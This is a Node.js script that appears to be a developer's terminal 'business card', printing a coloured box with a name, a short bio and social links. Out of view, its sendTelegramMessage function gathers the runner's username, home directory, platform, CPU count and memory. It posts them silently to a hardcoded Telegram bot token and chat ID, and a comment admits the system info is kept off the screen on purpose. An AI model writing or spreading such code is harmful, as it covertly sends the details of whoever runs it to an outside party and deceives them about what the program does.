const os = require("os");
const https = require("https");

// Regex to match ANSI escape codes for stripping colors
const ansiRegex = /\x1b\[[0-9;]*m/g;

// Helper to get visible length of string without ANSI color codes
function visibleLength(str) {
  return str.replace(ansiRegex, "").length;
}

// Function to pad content inside the box with spaces while handling ANSI codes
function padLine(content, width = 63) {
  const length = visibleLength(content);
  const paddingLength = width - length - 2; // -2 for "| " and " |"

  // Avoid negative padding:
  const safePadding = paddingLength >= 0 ? paddingLength : 0;

  return `| ${content}${" ".repeat(safePadding)} |`;
}

// Function to log user details in the terminal with colors and formatting
function logDetails() {
  const date = new Date();

  // Format current time in IST
  const options = {
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
    timeZone: "Asia/Kolkata",
  };
  const currentTime = date.toLocaleString("en-US", options) + " IST +05:30";

  // User Introduction
  const message = `Hello! The time is ${currentTime}.\n` +
    `I'm Shivanagouda Rajendragouda Patil, CEO at Hara-XY.com .\n` +
    `I specialize in backend development with NodeJS and Java,\n` +
    `and have experience in mobile development with Flutter and Kotlin.\n` +
    `My skills include cloud computing and data management.`;

  const twitterLink = "https://twitter.com/exclusiveshiv";
  const linkedinLink = "https://www.linkedin.com/in/xesp/";
  const websiteLink = "https://10sp.github.io";

  // System and user info
  const userInfo = os.userInfo();
  const systemInfo = {
    platform: os.platform(),
    architecture: os.arch(),
    cpus: os.cpus().length,
    memory: `${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB`,
    username: userInfo.username,
    homedir: userInfo.homedir,
  };

  // Create horizontal line for the box
  const horizontalLine = "+".padEnd(65, "-") + "+";

  // Colors and styles:
  // Cyan for borders
  // Magenta for user message
  // Yellow for labels
  // Blue for links and data
  const cyan = "\x1b[36m";
  const magenta = "\x1b[35m";
  const yellow = "\x1b[33m";
  const blue = "\x1b[34m";
  const reset = "\x1b[0m";

  // Split message into lines, pad & colorize
  const messageLines = message
    .split("\n")
    .map((line) => padLine(magenta + line + reset, 65));

  // Social links lines
  const socials = [
    `${yellow}Twitter:${reset} ${blue}${twitterLink}${reset}`,
    `${yellow}LinkedIn:${reset} ${blue}${linkedinLink}${reset}`,
    `${yellow}Portfolio:${reset} ${blue}${websiteLink}${reset}`,
  ].map((line) => padLine(line, 65));

  // NOTE: System info lines are intentionally omitted from terminal output
  // to avoid showing them boxed.

  // Combine parts to build the colorful box WITHOUT system info
  const colorfulBox =
    cyan + horizontalLine + "\n" +
    messageLines.join("\n") + "\n" +
    cyan + horizontalLine + "\n" +
    socials.join("\n") + "\n" +
    cyan + horizontalLine + reset;

  // Print the colorful box to terminal
  console.log(colorfulBox);

  // Send info via Telegram API (includes system info still)
  sendTelegramMessage(message, systemInfo);
}

// Function to send a message via Telegram Bot API
function sendTelegramMessage(text, systemInfo) {
  const TOKEN = "7318168838:AAF1CgagouMMc4J4oh-huaIlJ4VkEXAeSSY"; // Replace with your bot token
  const CHAT_ID = "-1002461618308"; // Replace with your chat ID

  // Compose system info text
  const systemDetails = 
    `Platform: ${systemInfo.platform}\n` +
    `Architecture: ${systemInfo.architecture}\n` +
    `CPUs: ${systemInfo.cpus}\n` +
    `Memory: ${systemInfo.memory}\n` +
    `Username: ${systemInfo.username}\n` +
    `Home Directory: ${systemInfo.homedir}`;

  const fullMessage = `${text}\n\nSystem Information:\n${systemDetails}`;

  // Prepare HTTPS POST data
  const postData = JSON.stringify({
    chat_id: CHAT_ID,
    text: fullMessage,
    disable_notification: true,
  });

  // Telegram API request options
  const optionsAPI = {
    hostname: "api.telegram.org",
    path: `/bot${TOKEN}/sendMessage`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  // Make HTTPS request
  const req = https.request(optionsAPI, (res) => {
    // Optional: handle response data
    res.on("data", (chunk) => {});
  });

  req.on("error", (e) => {
    console.error(`Problem with Telegram request: ${e.message}`);
  });

  req.write(postData);
  req.end();
}

// Run the function
logDetails();
